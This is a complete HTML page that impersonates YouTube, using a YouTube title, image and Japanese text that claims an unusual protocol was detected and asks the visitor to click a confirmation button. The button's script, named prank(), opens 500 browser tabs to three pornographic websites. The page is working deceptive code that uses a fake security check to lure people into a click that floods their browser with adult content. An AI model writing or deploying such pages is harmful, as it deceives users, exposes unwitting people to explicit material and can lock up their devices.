<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>YouTube</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .box {
      background: #fff;
      padding: 30px 40px;
      border-radius: 10px;
      box-shadow: 0 8px 25px rgba(0,0,0,.15);
      text-align: center;
      max-width: 420px;
    }
    button {
      background: #ff0000;
      color: #fff;
      border: none;
      padding: 12px 24px;
      font-size: 15px;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover { background: #005fcc; }
    .note {
      margin-top: 15px;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTk9wr6BpV7XJ_KMBButPKf6rNv7UjiL-yckgOOl4KmkExGBo8L0aMIkY4&s=10" width="80" height="50">
  <div class="box">
    <h1>YouTubeをご利用するには<br>以下のボタンを押してください</h1>
    <p>通常とは違うプロコトルが確認されたため、下のボタンをクリックしてください。</p>
    <button onclick="prank()">確認する</button>
  </div>

  <script>
    function prank() {
      const n = 500; // ← 開きたい数をここで変更だぜbro

      const urls = [
        "https://pronhub.com",
        "https://sex.com",
        "https://xvideos.com"
      ];

      for (let i = 0; i < n; i++) {
        const url = urls[i % urls.length];
        window.open(url, "_blank");
      }
    }
  </script>
</body>
</html>
